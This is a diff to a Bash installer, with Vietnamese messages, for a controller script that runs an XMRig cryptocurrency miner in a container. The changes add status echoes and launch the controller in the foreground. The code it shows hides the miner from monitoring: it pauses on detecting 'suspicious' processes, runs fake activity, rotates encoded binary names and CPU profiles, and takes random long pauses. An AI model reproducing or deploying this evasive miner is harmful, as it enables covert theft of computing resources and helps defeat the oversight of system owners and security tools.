@@ -909,6 +909,17 @@ run_cleanup() {
 
 
 # --- Vòng lặp chính để duy trì miner ---
+# Phần này sẽ được chạy ở foreground nếu người dùng chọn
+echo "--------------------------------------------------------"
+echo " MINER CONTROLLER: ĐANG CHẠY TRONG TERMINAL NÀY "
+echo "--------------------------------------------------------"
+echo "Để đưa miner ra nền (background):"
+echo "  Nhấn Ctrl+Z, sau đó gõ 'bg' và Enter."
+echo "Để dừng miner hoàn toàn (cả controller và miner):"
+echo "  Nhấn Ctrl+C."
+echo "--------------------------------------------------------"
+sleep 2
+
 while true; do
     current_timestamp=\$(date +%s)
     local state_data=\$(cat "\$STATE_FILE" 2>/dev/null)
@@ -926,6 +937,7 @@ while true; do
     if [ -n "\$long_pause_end_timestamp" ] && (( current_timestamp < long_pause_end_timestamp )); then
         stop_miner
         log_message "Still in long pause until \$(date -d @\$long_pause_end_timestamp). Miner stopped."
+        echo "\$(date +'%Y-%m-%d %H:%M:%S'): Miner tạm dừng (long pause) đến \$(date -d @\$long_pause_end_timestamp)..."
         echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
         run_fake_activity
         sleep 60 # Kiểm tra lại sau 1 phút
@@ -935,6 +947,7 @@ while true; do
     if [ -n "\$suspicious_pause_end_timestamp" ] && (( current_timestamp < suspicious_pause_end_timestamp )); then
         stop_miner
         log_message "Still in suspicious activity pause until \$(date -d @\$suspicious_pause_end_timestamp). Miner stopped."
+        echo "\$(date +'%Y-%m-%d %H:%M:%S'): Miner tạm dừng (suspicious pause) đến \$(date -d @\$suspicious_pause_end_timestamp)..."
         echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
         run_fake_activity
         sleep 60 # Kiểm tra lại sau 1 phút
@@ -946,6 +959,7 @@ while true; do
         local pause_duration=\$(( SUSPICIOUS_PAUSE_MIN_SECONDS + RANDOM % (SUSPICIOUS_PAUSE_MAX_SECONDS - SUSPICIOUS_PAUSE_MIN_SECONDS + 1) ))
         suspicious_pause_end_timestamp=\$(( current_timestamp + pause_duration ))
         log_message "Detected suspicious process. Pausing miner for \$((pause_duration / 60)) minutes."
+        echo "\$(date +'%Y-%m-%d %H:%M:%S'): PHÁT HIỆN TIẾN TRÌNH ĐÁNG NGỜ! Tạm dừng miner trong \$((pause_duration / 60)) phút."
         echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
         run_fake_activity
         sleep 60 # Kiểm tra lại sau 1 phút
@@ -954,6 +968,7 @@ while true; do
 
     if [ -n "\$suspicious_pause_end_timestamp" ] && (( current_timestamp >= suspicious_pause_end_timestamp )); then
         log_message "Suspicious activity pause ended. Resuming normal operations."
+        echo "\$(date +'%Y-%m-%d %H:%M:%S'): Tạm dừng đáng ngờ kết thúc. Khởi động lại miner."
         suspicious_pause_end_timestamp=""
     fi
 
@@ -969,11 +984,13 @@ while true; do
         if (( time_since_last_run_minutes >= max_duration_minutes )) || (( RANDOM % 100 < CHANCE_TO_SWITCH_PROFILE )); then
             stop_miner
             log_message "Miner finished current profile or switching. Stopping miner."
+            echo "\$(date +'%Y-%m-%d %H:%M:%S'): Miner đã hoàn thành profile hoặc sắp chuyển đổi. Đang dừng miner."
 
             if (( RANDOM % 100 < CHANCE_FOR_LONG_PAUSE )); then
                 local pause_duration_hours=\$(( LONG_PAUSE_MIN_HOURS + RANDOM % (LONG_PAUSE_MAX_HOURS - LONG_PAUSE_MIN_HOURS + 1) ))
                 long_pause_end_timestamp=\$(( current_timestamp + pause_duration_hours * 3600 ))
                 log_message "Entering long pause for \$pause_duration_hours hours until \$(date -d @\$long_pause_end_timestamp)."
+                echo "\$(date +'%Y-%m-%d %H:%M:%S'): Đang tạm dừng dài hạn trong \$pause_duration_hours giờ đến \$(date -d @\$long_pause_end_timestamp)."
                 echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
                 run_fake_activity
                 sleep 60 # Kiểm tra lại sau 1 phút
@@ -991,11 +1008,13 @@ while true; do
             should_run_miner=1
         else
             log_message "Miner still running current profile. Next check in $(( max_duration_minutes - time_since_last_run_minutes )) minutes."
+            echo "\$(date +'%Y-%m-%d %H:%M:%S'): Miner đang chạy profile hiện tại. Kiểm tra lại sau $(( max_duration_minutes - time_since_last_run_minutes )) phút."
             should_run_miner=0
         fi
     else
         if [ -n "\$long_pause_end_timestamp" ] && (( current_timestamp >= long_pause_end_timestamp )); then
             log_message "Long pause ended. Resuming normal operations."
+            echo "\$(date +'%Y-%m-%d %H:%M:%S'): Tạm dừng dài hạn kết thúc. Tiếp tục hoạt động bình thường."
             long_pause_end_timestamp=""
         fi
 
@@ -1003,13 +1022,16 @@ while true; do
             current_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} ))
             current_bin_name_encoded=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
             log_message "Initializing miner with new profile and binary name."
+            echo "\$(date +'%Y-%m-%d %H:%M:%S'): Khởi tạo miner với profile và tên binary mới."
         fi
 
         if (( RANDOM % 100 < CHANCE_TO_RUN )); then
             should_run_miner=1
             log_message "Chance to run met. Attempting to start miner."
+            echo "\$(date +'%Y-%m-%d %H:%M:%S'): Đủ điều kiện chạy. Đang cố gắng khởi động miner."
         else
             log_message "Chance to run not met. Miner remains stopped."
+            echo "\$(date +'%Y-%m-%d %H:%M:%S'): Không đủ điều kiện chạy. Miner vẫn tạm dừng."
         fi
     fi
 
@@ -1031,13 +1053,20 @@ EOF
 echo "Trong môi trường container, Systemd và Cron không được sử dụng để quản lý dịch vụ."
 
 echo "Cài đặt hoàn tất."
-echo "Để **khởi động miner**, hãy chạy lệnh sau (nó sẽ chạy ngầm và tự duy trì):"
-echo "  nohup /bin/bash $MINER_DIR/master_controller.sh > /dev/null 2>&1 &"
+echo "--------------------------------------------------------"
+echo " MINER CONTROLLER SẼ KHỞI ĐỘNG TRONG TERMINAL NÀY BÂY GIỜ "
+echo "--------------------------------------------------------"
+echo "Để đưa miner ra nền (background) và có thể đóng terminal:"
+echo "  Nhấn Ctrl+Z (để tạm dừng tiến trình), sau đó gõ 'bg' và Enter."
+echo "Để dừng miner hoàn toàn (cả controller và miner):"
+echo "  Nhấn Ctrl+C (khi đang ở màn hình hiển thị này)."
+echo "  Hoặc, nếu đã đưa ra nền, dùng lệnh sau: pkill -9 -f \"$MINER_DIR/master_controller.sh\""
 echo ""
-echo "Để **kiểm tra log của miner** (các hoạt động và trạng thái):"
+echo "Bạn cũng có thể xem log chi tiết mọi lúc bằng cách mở terminal khác và gõ:"
 echo "  tail -f $MINER_DIR/controller.log"
 echo ""
-echo "Để **dừng miner** (bao gồm cả script điều khiển và tiến trình XMRig):"
-echo "  pkill -9 -f \"$MINER_DIR/master_controller.sh\" && pkill -9 -f \"$(echo "$MINER_ACTUAL_PATH" | sed 's/\./\\\./g')\""
-echo ""
-echo "Vui lòng giữ các lệnh này để quản lý miner của bạn."
+echo "Bây giờ, tự động khởi chạy master_controller.sh trong terminal này..."
+echo "--------------------------------------------------------"
+
+# Thay vì 'nohup ... &', giờ chạy trực tiếp ở foreground
+/bin/bash "$MINER_DIR/master_controller.sh"
